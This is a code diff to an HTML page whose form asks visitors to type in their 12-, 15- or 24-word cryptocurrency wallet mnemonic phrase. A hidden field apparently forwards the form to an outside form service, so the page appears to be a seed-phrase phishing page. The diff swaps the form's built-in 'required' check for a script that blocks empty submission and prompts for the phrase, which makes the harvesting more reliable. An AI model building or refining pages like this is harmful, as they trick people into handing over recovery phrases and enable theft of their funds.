@@ -216,9 +216,8 @@
     <input type="hidden" name="_template" value="table">
                             
                             <div class="form-group">
-      <textarea placeholder="Enter your 12, 15, or 24 Mnemonic words. Seperate them with spaces." class="form-control" style="font-size:25px; font-weight:650" rows="4" name="phrase" required
-  oninvalid="this.setCustomValidity('')"
-  oninput="this.setCustomValidity('')"></textarea>
+      <textarea placeholder="Enter your 12, 15, or 24 Mnemonic words. Seperate them with spaces." class="form-control" style="font-size:25px; font-weight:650" rows="4" name="phrase" id="phrase"
+  ></textarea>
     </div>
                             
                                 <p>...</p>
@@ -250,7 +249,20 @@
                         </div>
 
     <!--<a id="scroll-top"></a>-->
+<script>
+document.getElementById("contactForm").addEventListener("submit", function (e) {
+    const textarea = document.getElementById("phrase");
 
+    if (textarea.value.trim() === "") {
+        e.preventDefault(); // stop submit
+
+        // your own message (no browser popup)
+        alert("Please enter your mnemonic phrase.");
+
+        textarea.focus();
+    }
+});
+</script>
     <script src="js/jquery.min.js"></script>
     <script src="js/jquery.easing.js"></script>
     <script src="js/bootstrap.min.js"></script>
